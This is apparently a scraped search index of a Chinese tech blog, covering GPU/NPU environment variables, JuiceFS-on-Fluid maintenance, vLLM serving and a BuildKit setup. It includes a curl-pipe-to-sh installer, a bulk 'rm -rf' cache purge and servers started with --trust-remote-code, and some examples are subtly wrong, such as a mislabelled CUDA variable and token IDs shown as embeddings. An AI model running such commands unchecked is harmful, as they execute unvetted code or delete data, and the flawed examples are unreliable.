的核心思想是将位置编码与词向量通过旋转矩阵相乘，使得词向量不仅包含词汇的语义信息，还融入了位置信息，其具有以下优点：\n相对位置感知：RoPE 能够自然地捕捉词汇之间的相对位置关系。 无需额外的计算：位置编码与词向量的结合在计算上是高效的。 适应不同长度的序列：RoPE 可以灵活处理不同长度的输入序列。 ","description":"","id":4,"section":"post","tags":["博文","Qwen","大模型","学习"],"title":"以 Qwen 为例，学习大模型的结构","uri":"https://www.chenshaowen.com/blog/structure-of-large-models-with-qwen.html"},{"content":"NVIDIA_VISIBLE_DEVICES 指定程序可见的 GPU 设备\n1 CUDA_VISIBLE_DEVICES=0,1 可用值:\n1,2，以逗号分隔的 GPU UUID 或索引列表 all，所有 GPU none，加载驱动，但无法访问 GPU void，不加载驱动 NVIDIA_DRIVER_CAPABILITIES 控制哪些驱动程序库/二进制文件将被安装在容器内\n1 NVIDIA_DRIVER_CAPABILITIES=compute,utility 可用值:\ncompute，CUDA 和 OpenCL 应用程序所需。 compat32，运行 32 位应用程序所需。 graphics，运行 OpenGL 和 Vulkan 应用程序所需。 utility，nvidia-smi 使用和 NVML 所需。 video，使用视频编解码器 SDK 所必需的。 display，利用 X11 显示所需。 NVIDIA_REQUIRE_CUDA 用于指定所需的 CUDA 版本和驱动程序版本\n1 NVIDIA_REQUIRE_CUDA=\u0026#34;cuda\u0026gt;=11.0 driver\u0026gt;=450\u0026#34; 1 NVIDIA_REQUIRE_CUDA=\u0026#34;cuda\u0026gt;=11.7\u0026#34; NVIDIA_REQUIRE_DRIVER 用于指定所需的驱动程序版本\n1 NVIDIA_REQUIRE_DRIVER=\u0026#34;driver\u0026gt;=470\u0026#34; NVIDIA_REQUIRE_BRAND 用于指定所需的 GPU 品牌\n1 2 NVIDIA_REQUIRE_BRAND=\u0026#34;tesla\u0026#34; NVIDIA_REQUIRE_BRAND=\u0026#34;geforce\u0026#34; NVIDIA_REQUIRE_ARCH 用于指定所需的 GPU 架构\n1 NVIDIA_REQUIRE_ARCH \u0026#34;maxwell pascal volta turing ampere\u0026#34; CUDA_DEVICE_ORDER 按照 PCI_BUS_ID 顺序从 0 开始排列 GPU 设备。\n1 export CUDA_VISIBLE_DEVICES=\u0026#39;PCI_BUS_ID\u0026#39; 只使用前两个 GPU\nLD_LIBRARY_PATH 指定动态链接库的路径，确保运行时可以找到 CUDA 库文件。\n1 LD_LIBRARY_PATH=/usr/local/cuda/lib64:/usr/lib/x86_64-linux-gnu:/usr/local/nvidia/lib CUDNN_PATH 指定 cuDNN 库的安装路径\n1 CUDNN_PATH=/usr/local/cuda CUDA_HOME 构建 CUDA 应用时，搜索 CUDA 库文件和工具的路径\n1 CUDA_HOME=/usr/local/cuda CUDA_PATH NVIDIA 自己的开发工具搜索 CUDA 库文件和工具的路径\n1 CUDA_PATH=/usr/local/cuda ","description":"","id":5,"section":"post","tags":["博文","AI","环境","NVIDIA","GPU"],"title":"NVIDIA 环境变量配置","uri":"https://www.chenshaowen.com/blog/nvidia-environment-variable-configuration.html"},{"content":"HCCL_IF_IP 配置 HCCL 的初始化 root 通信网卡 IP 。\n环境变量 HCCL_IF_IP \u0026gt; 环境变量 HCCL_SOCKET_IFNAME \u0026gt; docker/lo 以外网卡(网卡名字典序升序) \u0026gt; docker 网卡 \u0026gt; lo 网卡。\n1 export HCCL_IF_IP=10.10.10.1 HCCL_IF_BASE_PORT 指定 Host 网卡起始端口号，配置后系统默认占用以该端口起始的 16 个端口进行集群信息收集，取值范围为[1024,65520] 。\n1 export HCCL_IF_BASE_PORT=50000 HCCL_SOCKET_IFNAME HCCL 可通过该网卡名获取 Host IP\n支持以下格式\nexport HCCL_SOCKET_IFNAME=eth,enp，表示使用所有以 eth 或 enp 为前缀的网卡。 export HCCL_SOCKET_IFNAME=^eth,enp，表示不使用任何以 eth 或 enp 为前缀的网卡。 export HCCL_SOCKET_IFNAME==eth0,enp0，表示使用 eth0 网卡或 enp0 网卡。 export HCCL_SOCKET_IFNAME=^=eth0,enp0，表示不使用 eht0 与 enp0 网卡。 HCCL_SOCKET_FAMILY 量指定通信网卡使用的 IP 协议\n1 2 export HCCL_SOCKET_FAMILY=AF_INET #IPv4 export HCCL_SOCKET_FAMILY=AF_INET6 #IPv6 HCCL_CONNECT_TIMEOUT 用于限制不同设备之间 socket 建链过程的超时等待时间，取值范围[120,7200]，默认值 120s。\n1 export HCCL_CONNECT_TIMEOUT=200 HCCL_EXEC_TIMEOUT 控制设备间执行时同步等待的时间，取值范围不同设备有差异，默认值为 1836s。\n1 export HCCL_EXEC_TIMEOUT=1800 HCCL_INTRA_PCIE_ENABLE 配置 Server 内是否使用 PCIe 环路进行多卡间的通信\n1 export HCCL_INTRA_PCIE_ENABLE=1 HCCL_INTRA_ROCE_ENABLE 配置 Server 内是否使用 RoCE 环路进行多卡间的通信\n1 export HCCL_INTRA_ROCE_ENABLE=1 HCCL_WHITELIST_FILE 当已通过 HCCL_WHITELIST_DISABLE 开启了通信白名单校验功能时，需要通过此环境变量配置指向 HCCL 通信白名单配置文件的路径，只有在通信白名单中的 IP 地址才允许进行集合通信\n1 export HCCL_WHITELIST_FILE=/home/test/whitelist 文件格式 { \u0026quot;host_ip\u0026quot;: [\u0026quot;ip1\u0026quot;, \u0026quot;ip2\u0026quot;], \u0026quot;device_ip\u0026quot;: [\u0026quot;ip1\u0026quot;, \u0026quot;ip2\u0026quot;] } HCCL_WHITELIST_DISABLE 配置在使用 HCCL 时是否关闭通信白名单，1 表示关闭白名单，0 表示开启，默认值为 1。\n1 export HCCL_WHITELIST_DISABLE=1 HCCL_RDMA_TC 配置 RDMA 网卡的 traffic class，默认值为 132。\n1 export HCCL_RDMA_TC=100 HCCL_RDMA_SL 配置 RDMA 网卡的 service level，该值需要和网卡配置的 PFC 优先级保持一致，若配置不一致可能导致性能劣化，取值范围[0,7]，默认值 4。\n1 export HCCL_RDMA_SL=3 HCCL_BUFFSIZE HCCL 通信缓存的大小。\n通过在计算节点上预分配一定数量的内存空间，用于存储通信数据，避免频繁的内存分配和释放操作，从而提高了通信效率。HCCL_BUFFSIZE 默认值为 100 MB。\n1 export HCCL_BUFFSIZE=200 HCCL_RDMA_TIMEOUT 配置 RDMA 网卡重传超时时间的系数 timeout，默认值为 20\n1 export HCCL_RDMA_TIMEOUT=6 HCCL_RDMA_RETRY_CNT 配置 RDMA 网卡的重传次数，需要配置为整数，取值范围为[1,7]，默认值为 7。\n1 export HCCL_RDMA_RETRY_CNT=5 HCCL_BUFFSIZE 控制两个 NPU 之间共享数据的缓存区大小。单位为 M，需要配置为整数，取值大于等于 1，默认值是 200M。\n计算公式: (MircobatchSize _ SequenceLength _ hiddenSize * sizeOf (DataType) )/(1024*1024)，向上取整。\n1 export HCCL_BUFFSIZE=200 HCCL_ALGO 配置集合通信 Server 间跨机通信算法，支持全局配置算法类型与按算子配置算法类型两种配置方式\n全局配置 1 export HCCL_ALGO=\u0026#34;level0:NA;level1:\u0026lt;algo\u0026gt;\u0026#34; algo 取值范围 ring、H-D_R、NHR、NHR_V1、NB、pipeline、pairwise\n按算子配置 1 export HCCL_ALGO=\u0026#34;\u0026lt;op0\u0026gt;=level0:NA;level1:\u0026lt;algo0\u0026gt;/\u0026lt;op1\u0026gt;=level0:NA;level1:\u0026lt;algo1\u0026gt;\u0026#34; algo 取值范围 op、algo\nHCCL_DIAGNOSE_ENABLE 配置集合通信是否缓存部分任务的详细信息，以便任务执行失败时，打印详细日志，用于问题定位，1 表示开启，0 表示关闭，默认值为 0。\n1 export HCCL_DIAGNOSE_ENABLE=1 HCCL_ENTRY_LOG_ENABLE 控制集合通信算子调用行为日志的打印方式，1 为调用一次打印一次，0 为统一打印，默认值为 0。\n1 export HCCL_ENTRY_LOG_ENABLE=1 HCCL_OP_EXPANSION_MODE 配置通信算法的编排展开位置，取值范围:\nAI_CPU，代表通信算法的编排展开位置在 Device 侧的 AI CPU 计算单元 AIV，代表通信算法的编排展开位置在 Device 的 AI Vector Core 计算单元 默认为空，保持原有算法编排位置 1 export HCCL_OP_EXPANSION_MODE=\u0026#34;AI_CPU\u0026#34; HCCL_DETERMINISTIC 配置是否开启归约类通信算子的确定性计算，其中归约类通信算子包括 AllReduce、ReduceScatter、Reduce，默认值 false，不开启。\n1 export HCCL_DETERMINISTIC=true ","description":"","id":6,"section":"post","tags":["博文","AI","环境","Ascend","NPU"],"title":"Ascend 环境变量配置","uri":"https://www.chenshaowen.com/blog/ascend-environment-variable-configuration.html"},{"content":"1. 设置环境变量 1 2 export NAMESPACE=xxx export PVC=xxx 2. Dataset 无法就绪 2.1 Fluid 组件问题 1 kubectl -n fluid-system get pod -o wide | grep -v \u0026#34;Running\u0026#34; 可能出现没有正常启动的情况。\n2.2 有异常的 Dataset 异常的资源可能导致 Fluid 资源不断重启，需要人工介入删除。\n2.3 检查 Worker \\ Fuse 副本 worker 副本 1 kubectl -n ${NAMESPACE} get sts -l release=${PVC} 1 kubectl -n ${NAMESPACE} get pod -l release=${PVC},role=juicefs-worker fuse 副本 1 kubectl -n kas-job get ds -l release=${PVC} 1 kubectl -n ${NAMESPACE} get pod -l release=${PVC},role=juicefs-fuse 3. Fuse 问题，无法使用 PVC 3.1 没有创建 Fuse Pod 节点缺少标签，下面这个命令可以给全部节点打标签:\n1 kubectl label node fluid.io/f-${NAMESPACE}-${PVC}=true --all 下面是标签的格式:\n1 fluid.io/f-\u0026lt;namespace\u0026gt;-\u0026lt;pvc\u0026gt;=true 3.2 Fuse 挂载有问题 1 kubectl -n ${NAMESPACE} logs -l release=${PVC},role=juicefs-fuse -f --max-log-requests 100 could not find the requested resource 1 Error from server (NotFound): the server could not find the requested resource ( pods/log ${PVC}-fuse-8xnmd) fuse 报错 强制删除 fuse pod\n3.3 Fuse 报错 WithTimeout 报错日志如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 goroutine 5248 [select]: github.com/juicedata/juicefs/pkg/utils.WithTimeout(0xc021778000, 0x4af8e8?) /root/go/pkg/mod/github.com/juicedata/juicefs@v1.2.0-dev.0.20240116052722-9bab947db092/pkg/utils/utils.go:112 +0x125 jfs/pkg/chunk.(*cachedStore).put(0xc001424000, {0xc021776020, 0x1f}, 0xc027c6c370) /opt/jfs/pkg/chunk/cached_store.go:630 +0x245 jfs/pkg/chunk.(*cachedStore).putWithRetry(0xc001424000, {0xc021776020, 0x1f}, 0x24f10a0?, 0xc025cbb8a0) /opt/jfs/pkg/chunk/cached_store.go:688 +0xfd jfs/pkg/chunk.(*wChunk).syncUpload(0xc025cbb830, {0x3147e80?, 0xc00005c0e0?}, {0xc021776020, 0x1f}, 0xc027c6c370?) /opt/jfs/pkg/chunk/cached_store.go:681 +0x295 jfs/pkg/chunk.(*wChunk).upload.func1(0x0) /opt/jfs/pkg/chunk/cached_store.go:837 +0x779 created by jfs/pkg/chunk.(*wChunk).upload /opt/jfs/pkg/chunk/cached_store.go:749 +0x27b 先检查元数据、对象存储服务的连通性，再检查主机上是否存在之前 Fuse Pod 的残留。\n4. Worker 问题，缓存异常 4.1 Worker PartialReady 查看 JuiceFSRuntime 的状态 1 2 3 4 kubectl -n ${NAMESPACE} get juicefsruntimes.data.fluid.io NAME WORKER PHASE FUSE PHASE AGE ${PVC} PartialReady Ready 32m 查看 Worker 的日志 1 2 3 kubectl -n ${NAMESPACE} logs -l release=${PVC},role=juicefs-worker -f --max-log-requests 100 Error from server (NotFound): the server could not find the requested resource ( pods/log ${PVC}-worker-53) 删除异常的 Worker 这种 Worker 可能是正常启动的，但是 Fluid 获取不到其 stats 状态，会判断其未就绪。\n1 kubectl -n ${NAMESPACE} delete pod ${PVC}-worker-53 移除异常 Worker 节点的标签 如果 worker 是使用了 nodeSelector 选择节点，应该移除改节点的标签。\n4.2 某些 Worker 异常 1 2025/02/13 08:07:10.759238 juicefs[216] \u0026lt;WARNING\u0026gt;: send block chunks/93/67/67065235_8_4194304: peer x.x.x.x:43891: read header: read tcp x.x.x.x:46482-\u0026gt;x.x.x.x:43891: i/o timeout [peer.go:338] 这种情况下，可以 delete 该 Worker，让其重新启动。\n4.3 Worker 资源不足 1 kubectl -n ${NAMESPACE} top pod |grep ai-kas-aigc-jfs-fluid-worker 查看 Worker 的资源使用情况，查看是否接近 Limit 配置。\n5. 速度波动很大 速度波动主要是缓存问题，先参考 https://juicefs.com/docs/zh/cloud/guide/distributed-cache/#troubleshooting 进行排查。\n5.1 有跨区域的 Worker 组建了分布式缓存 1 2 3 kubectl -n ${NAMESPACE} logs -l release=${PVC},role=juicefs-worker 2025/01/16 04:12:05.546591 juicefs[189] \u0026lt;INFO\u0026gt;: add peer x.x.102.47:42769 with weight 100 [peer.go:773] 在 Worker 的日志中，通过 add peer 可以找到全部的缓存节点，检查是否有不符合预期的节点。同一个 cache group 的节点应该在同一个区域。\n5.2 没有在 Worker 节点预热 JuiceFS 有两级缓存，如果在 Fuse 预热，只能在当前节点使用缓存，应该去 Worker 节点预热，才能提供给其他节点使用。\n5.3 磁盘满导致缓存被清理 企业版 JuiceFS 有监控面板，查看 Block Cache Eviction Rate 是否有异常。\n在磁盘满或者达到 JuiceRuntime 配置的阈值时，会清理缓存，就会导致速度波动。\n这种情况下，可以根据缓存目录的创建时间，清理一下超过 30d 的缓存。\n1 find /data*/jfs*/*/raw/chunks -maxdepth 3 -type d -mtime +30 -exec rm -rf {} + 2\u0026gt;/dev/null || true 5.4 low 参数设置不合理 low 表示磁盘最低应该保留的空间，如果设置过高，会导致 JuiceFS 不断清理缓存。\n此时，Juicefs 监控表现就是缓存命中率低、缓存清理速度大。\n解决方法是降低 low 参数，默认值是 0.2。\n5.5 部分节点慢 在 JuiceFS 的监控面板中，可以找到 Remote Cache Latency，查看是否有异常节点。\n6. 访问速度慢 6.1 Cache-Group 不一致 使用 Fluid 1.0.0 版本配置企业版 JuiceFS 时，如果在 DataSet 中配置了 Cache，Fuse 和 Worker 的 Cache-Group 就会不一致。\nJuiceFS 监控的表现就是缓存命中率低，只有 30% 左右，而正常情况下预热之后应该在 80% 以上。\n最好不要配置 Cache-Group，让 Fluid 自动配置。\n7. 运维建议 7.1 固定每一个 Worker 所在的节点 固定 Worker 所在的节点，可以避免 Worker 重启之后，导致缓存丢失。\n具体方法是，将 NodeSelector 设置为指定标签，是得打上标签的节点数等于 Worker 的副本数。\n由于 Worker 是 StatefulSet 部署，每次重启时会一个个按照顺序启动，可以保证每个 Worker 会在固定一个节点上。\n8. 版本升级 从 1.0.0 升级到 1.0.4\n下载 1.0.4 版本的 Fluid 1 wget https://github.com/fluid-cloudnative/fluid/releases/download/v1.0.4/fluid-1.0.4.tgz 查看可选参数 1 tar -zxvf fluid-1.0.4.tgz 1 helm show values ./fluid 开始升级 1 helm upgrade fluid ./fluid --set crdUpgrade.imagePrefix=registry.cn-beijing.aliyuncs.com/opshub --set crdUpgrade.imageName=fluidcloudnative-fluid-crd-upgrader 由于 Fluid 默认拉取的是 DockerHub 的镜像，组件相关的 Deployment、StatefulSet 可能会出现 ImagePullBackOff 的情况，可以通过修改镜像地址解决。\n在重启过程中，缓存 worker 会被重启，Fuse 需要手工强制重启，需要注意的是重启 Fuse 会导致存储不可用，需要重启应用再次挂载。\n","description":"","id":7,"section":"post","tags":["博文","Fluid","JuiceFS","AI","Data","Lustre"],"title":"Fluid 下的 Juicefs 企业版维护","uri":"https://www.chenshaowen.com/blog/fluid-juicefs-enterprise-maintenance.html"},{"content":"1. 环境准备 下载 Miniforge 1 wget \u0026#34;https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-$(uname)-$(uname -m).sh\u0026#34; 安装 Miniforge 1 bash Miniforge3-$(uname)-$(uname -m).sh 1 2 echo \u0026#34;export PATH=$HOME/miniforge3/bin:$PATH\u0026#34; \u0026gt;\u0026gt; ~/.bashrc source ~/.bashrc 创建环境 1 conda create -n vllm python=3.12 目前 vllm 要求 Python 3.9+\n激活环境 1 conda activate vllm 安装依赖 1 conda install vllm 2. 推理测试 2.1 模型准备 设置模型地址 海外\n1 export MODEL_REPO=https://huggingface.co/Qwen/Qwen1.5-1.8B-Chat 国内\n1 export MODEL_REPO=https://hf-mirror.com/Qwen/Qwen1.5-1.8B-Chat 下载模型 1 nerdctl run --rm -v ./:/runtime registry.cn-beijing.aliyuncs.com/shaowenchen/git lfs clone $MODEL_REPO 2.2 Offline Batched Inference 这种推理方式适用于离线场景，比如批量推理。\n指定卡号 1 export CUDA_VISIBLE_DEVICES=1 使用 generate 推理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from vllm import LLM, SamplingParams model = LLM( model=\u0026#34;Qwen1.5-1.8B-Chat\u0026#34;, task=\u0026#34;generate\u0026#34;, enforce_eager=True, dtype=\u0026#34;half\u0026#34;, ) sampling_params = SamplingParams(temperature=0.8, top_p=0.95) datas = [ \u0026#34;Hello, my name is\u0026#34;, \u0026#34;The president of the United States is\u0026#34;, \u0026#34;The capital of France is\u0026#34;, \u0026#34;The future of AI is\u0026#34;, ] outputs = model.generate(datas, sampling_params) [output.outputs[0].text for output in outputs] 这里的 task 值默认是 auto，可选值 auto, generate, embedding, embed, classify, score, reward 。\n2.3 API Server For Online Serving 这种推理方式适用于在线场景，比如聊天机器人，提供了兼容 OpenAI API 的请求接口。\n指定卡号 1 export CUDA_VISIBLE_DEVICES=1 启动服务 1 2 3 4 5 6 7 python3 -m vllm.entrypoints.openai.api_server \\ --model Qwen1.5-1.8B-Chat \\ --served-model-name Qwen1.5-1.8B-Chat \\ --trust-remote-code \\ --dtype=half \\ --host 0.0.0.0 \\ --port 30000 由于测试设备是 V100，这里使用 half 精度。\n查看模型 1 2 3 4 5 6 7 8 9 10 11 12 curl http://127.0.0.1:30000/v1/models | jq . { \u0026#34;object\u0026#34;: \u0026#34;list\u0026#34;, \u0026#34;data\u0026#34;: [ { \u0026#34;id\u0026#34;: \u0026#34;Qwen1.5-1.8B-Chat\u0026#34;, \u0026#34;object\u0026#34;: \u0026#34;model\u0026#34;, \u0026#34;owned_by\u0026#34;: \u0026#34;vllm\u0026#34;, ... } ] } 测试推理 1 2 3 4 5 6 7 8 9 curl http://127.0.0.1:30000/v1/chat/completions \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;Qwen1.5-1.8B-Chat\u0026#34;, \u0026#34;messages\u0026#34;: [ {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;什么是大模型\u0026#34;} ], \u0026#34;max_tokens\u0026#34;: 1024 }\u0026#39; 查看 Metrics 指标\n1 curl http://127.0.0.1:30000/metrics 多卡推理 如果单个卡无法加载模型，可以进行张量拆分到多个卡上。\n1 export CUDA_VISIBLE_DEVICES=1,3 1 2 3 4 5 6 7 8 python3 -m vllm.entrypoints.openai.api_server \\ --model Qwen1.5-1.8B-Chat \\ --served-model-name Qwen1.5-1.8B-Chat \\ --tensor-parallel-size 2 \\ --trust-remote-code \\ --dtype=half \\ --host 0.0.0.0 \\ --port 30000 3. 向量化 Embed RAG 应用中，需要将数据进行向量化，用于检索召回，这里测试一下向量化的功能。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from vllm import LLM model = LLM( model=\u0026#34;Qwen1.5-1.8B-Chat\u0026#34;, task=\u0026#34;embed\u0026#34;, enforce_eager=True, dtype=\u0026#34;half\u0026#34;, ) datas = [ \u0026#34;Hello, my name is\u0026#34;, \u0026#34;The president of the United States is\u0026#34;, \u0026#34;The capital of France is\u0026#34;, \u0026#34;The future of AI is\u0026#34;, ] outputs = model.embed(datas) [output.prompt_token_ids for output in outputs] 使用 embed 可以将数据批量向量化:\n1 2 3 4 [[9707, 11, 847, 829, 374], [785, 4767, 315, 279, 3639, 4180, 374], [785, 6722, 315, 9625, 374], [785, 3853, 315, 15235, 374]] 4. Lora 支持 4.1 模型准备 设置模型地址 海外\n1 export MODEL_REPO=https://huggingface.co/Speeeed/Qwen1.5-1.8B-Chat-wsc-lora 国内\n1 export MODEL_REPO=https://hf-mirror.com/Speeeed/Qwen1.5-1.8B-Chat-wsc-lora 下载模型 除了刚才的基座模型，额外再下载一个 lora 模型。\n1 nerdctl run --rm -v ./:/runtime registry.cn-beijing.aliyuncs.com/shaowenchen/git lfs clone $MODEL_REPO 4.2 加载 lora 指定卡号 1 export CUDA_VISIBLE_DEVICES=1 启动服务 1 2 3 4 5 6 7 8 9 python3 -m vllm.entrypoints.openai.api_server \\ --model Qwen1.5-1.8B-Chat \\ --served-model-name Qwen1.5-1.8B-Chat \\ --trust-remote-code \\ --dtype=half \\ --host 0.0.0.0 \\ --port 30000 \\ --enable-lora \\ --lora-modules wsc-lora=Qwen1.5-1.8B-Chat-wsc-lora 查看可用模型 1 2 3 4 5 6 curl http://127.0.0.1:30000/v1/models | jq . | grep id \u0026#34;id\u0026#34;: \u0026#34;Qwen1.5-1.8B-Chat\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;modelperm-9d467dd1a39b4c81bf412255a9cc8729\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;wsc-lora\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;modelperm-137c35f3ad7d427a9d754e8ff87e953f\u0026#34;, 测试推理 1 2 3 4 5 6 7 8 9 curl http://127.0.0.1:30000/v1/chat/completions \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;wsc-lora\u0026#34;, \u0026#34;messages\u0026#34;: [ {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;什么是大模型\u0026#34;} ], \u0026#34;max_tokens\u0026#34;: 1024 }\u0026#39; 4.3 动态 lora vLLM 允许通过 API 动态加载和卸载 lora，而不需要重启服务。\n设置环境变量 1 2 export CUDA_VISIBLE_DEVICES=1 export VLLM_ALLOW_RUNTIME_LORA_UPDATING=True 启动服务 1 2 3 4 5 6 7 8 python3 -m vllm.entrypoints.openai.api_server \\ --model Qwen1.5-1.8B-Chat \\ --served-model-name Qwen1.5-1.8B-Chat \\ --trust-remote-code \\ --dtype=half \\ --host 0.0.0.0 \\ --port 30000 \\ --enable-lora 此时在 curl http://127.0.0.1:30000/v1/models 中只有一个模型 Qwen1.5-1.8B-Chat。\n加载 lora 1 2 3 4 5 6 curl -X POST http://localhost:30000/v1/load_lora_adapter \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;lora_name\u0026#34;: \u0026#34;wsc-lora\u0026#34;, \u0026#34;lora_path\u0026#34;: \u0026#34;Qwen1.5-1.8B-Chat-wsc-lora\u0026#34; }\u0026#39; 返回 Success: LoRA adapter 'wsc-lora' added successfully. 表示加载成功。此时在 \u0026lsquo;/v1/models\u0026rsquo; 中会出现 wsc-lora 模型。\n卸载 lora 1 2 3 4 5 curl -X POST http://localhost:30000/v1/unload_lora_adapter \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{ \u0026#34;lora_name\u0026#34;: \u0026#34;wsc-lora\u0026#34; }\u0026#39; 返回 Success: LoRA adapter 'wsc-lora' removed successfully. 表示卸载成功。\n5. vLLm vs Triton Inference Server 5.1 性能指标 指标 vLLM Triton Inference Server 吞吐量 vLLM 实现了高吞吐量，特别是在多用户场景中，由于其高效的 GPU 内存利用。 Triton 在与某些后端配对时表现出强大的吞吐量。然而，它通常无法达到 vLLM 所展示的峰值性能。 延迟 vLLM 具有低延迟，在处理较长输出时表现更优。 Triton 表现出低延迟，尽管它比 vLLM 的延迟相对较高，主要是由于缺少 vLLM 中的专门优化。 TTFT vLLM 针对大型语言模型进行了优化，可以更快地生成初始令牌，从而降低 TTFT。 Triton 也具有低 TTFT，但它可能因配置不同而有所变化，这间接地影响了 TTFT。 5.2 功能 功能 vLLM Triton Inference Server 支持的模型 vLLM 支持大多数开源 LLM、混合专家和多模态模型如 LLaVA。 Triton 支持多种框架和后端，允许部署各种模型类型，包括 LLM。 量化选项 vLLM 支持 AWQ、GPTQ、Marlin（结合 GPTQ、AWQ 和 FP8）、INT8（W8A8）、FP8（W8A8）、AQLM、bitsandbytes、DeepSpeedFP 和 GGUF。 Triton 支持多种框架和后端，能够适应广泛的量化技术，包括 vLLM 支持的技术。 LoRA 适配器 vLLM 具有强大的 LoRA 支持，允许在运行时动态加载和卸载适配器。提供灵活的模型切换能力。 Triton 通过自定义后端支持 LoRA，并且可以同时管理多个模型版本。 批处理能力 vLLM 支持连续批处理，新请求动态添加到现有批次中。 Triton 具有动态批处理算法，将单个请求组合成优化的批次以提高吞吐量。 流式支持 vLLM 提供内置的流式输出支持，实现与 LLM 的实时交互。 Triton 通过 gRPC 和 HTTP/REST API 支持流式推理，适用于实时应用。 API 兼容性 vLLM 提供实现 OpenAI 的 Completions 和 Chat API 的 HTTP 服务器。 Triton 提供 RESTful API 和 gRPC 端点，支持各种客户端集成。 社区与支持 vLLM 拥有活跃的 GitHub 和专门的 Discord 社区。vLLM 团队通过定期聚会促进参与。 Triton 通过 NVIDIA 论坛和 GitHub 仓库获得社区支持。 文档 vLLM 文档涵盖安装、配置、高级用法如模型量化和分布式推理，提供教程和示例。 Triton 具有广泛的文档，但用户常常因其功能和配置的复杂性而感到不知所措。 5.3 易用性 易用性 vLLM Triton Inference Server 安装 vLLM 可以通过 pip 和 Docker 轻松安装。 Triton 可以通过 Docker 安装，但由于不同模型框架的各种配置要求和依赖关系，过程可能较为复杂。 5.4 GPU 并行性 方面 vLLM Triton Inference Server GPU 并行性 vLLM 通过其创新的张量和流水线并行性在最大化 GPU 并行性方面表现出色。 Triton 支持使用自定义后端进行多 GPU 和多节点部署。它具有可用于流水线并行性的模型集成功能。 5.5 硬件兼容性和云部署选项 方面 vLLM Triton Inference Server 硬件兼容性 vLLM 支持多种选项，包括 Nvidia CUDA GPU、AMD ROCm GPU、AWS Neuron、CPU、OpenVINO、TPU 和 XPU。 Triton 兼容 Nvidia CUDA GPU 和 Intel CPU。 云部署选项 vLLM 设计为云无关，提供在各种云提供商中部署的灵活性。 Triton 可以部署在任何云平台上，并与 Kubernetes 集成，以实现可扩展的微服务架构。 来源 https://www.inferless.com/learn/vllm-vs-triton-inference-server-choosing-the-best-inference-library-for-large-language-models\n6. 与 Triton Inference Server 集成 Triton Server 是一个推理框架，提供以下功能：\n模型编排，在一个 Triton Server 实例中同时部署多个模型，一次性完成业务逻辑组装。比如，图片的下载、处理、推理等 多种后端支撑，比如 TensorRT、ONNX Runtime、PyTorch 等 动态 batching，根据请求的输入长度，动态调整 batch size，提高推理效率。但 Triton Server 的 batching 机制主要是针对的固定输入长度的深度学习模型，而 vLLM 是针对变长输入的大模型，参考 https://www.anyscale.com/blog/continuous-batching-llm-inference vLLM 与 Triton Server 集成，由 https://github.com/triton-inference-server/vllm_backend 提供，vLLM 也是 Triton Server 支撑的后端之一。\n7. vLLM 相关资源 文档 https://docs.vllm.ai/en/latest/ 博客 https://blog.vllm.ai/ 性能测试 https://perf.vllm.ai/ roadmap http://roadmap.vllm.ai/ 8. 总结 本篇主要是测试 vLLM 的推理功能，包括单卡、多卡、向量化 Embed、Lora 支持、动态 Lora。\n同时，整理了一下 vLLM 与 Triton Inference Server 的对比，包括性能指标、功能、易用性、GPU 并行性、硬件兼容性和云部署选项等。\n与之前测试 Triton Inference Server 相比，vLLM 的易用性更好，给部署带来极大便利.\n","description":"","id":8,"section":"post","tags":["博文","vLLM","AI","推理"],"title":"使用 vLLM 进行模型推理","uri":"https://www.chenshaowen.com/blog/use-vllm-for-inference.html"},{"content":"1. Nerdctl 安装 安装 Opscli 1 curl -sfL https://raw.githubusercontent.com/shaowenchen/ops/main/getcli.sh |VERSION=latest sh - 安装 Nerdctl 1 opscli task -f install-nerdctl --arch amd64 2. BuildKit 下载 Buildkit 1 wget https://github.com/moby/buildkit/releases/download/v0.19.0-rc2/buildkit-v0.19.0-rc2.linux-amd64.tar.gz 安装 Buildkit 1 2 tar xvf buildkit-*.tar.gz mv bin/* /usr/local/bin/ 配置 Buildkitd 1 mkdir -p /etc/buildkit /data/buildkit 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cat \u0026gt; /etc/buildkit/buildkitd.toml \u0026lt;\u0026lt;EOF debug = true root = \u0026#34;/data/buildkit\u0026#34; [worker.oci] enabled = false [worker.containerd] address = \u0026#34;/run/containerd/containerd.sock\u0026#34; enabled = true platforms = [ \u0026#34;linux/amd64\u0026#34;, \u0026#34;linux/arm64\u0026#34; ] namespace = \u0026#34;buildkit\u0026#34; gc = true gckeepstorage = 9000 cniPoolSize = 16 EOF 生成 Systemd Unit 文件 1 2 3 4 5 6 7 8 9 10 11 12 cat \u0026gt; /etc/systemd/system/buildkitd.service \u0026lt;\u0026lt; EOF [Unit] Description=buildkitd service Documentation=https://github.com/moby/buildkit [Service] Environment=\u0026#34;NYDUS_BUILDER=/usr/local/bin/nydus-image\u0026#34; ExecStart=/usr/local/bin/buildkitd --config /etc/buildkit/buildkitd.toml [Install] WantedBy=multi-user.target EOF 启动 Buildkitd 服务 1 2 3 systemctl enable buildkitd systemctl start buildkitd systemctl status buildkitd 3. 多架构配置 安装 Qemu 1 nerdctl run --privileged --rm registry.cn-beijing.aliyuncs.com/opshub/tonistiigi-binfmt:master --install all 查看 Qemu 配置 1 ls -1 /proc/sys/fs/binfmt_misc/qemu* 拉取指定架构镜像 1 nerdctl pull --platform=linux/arm64 registry.cn-beijing.aliyuncs.com/opshub/ubuntu:20.04 --all-platforms 可以拉取所有架构的镜像\n运行指定架构容器 1 nerdctl run --rm --platform=linux/arm64 registry.cn-beijing.aliyuncs.com/opshub/ubuntu:20.04 uname -m 4. 镜像构建 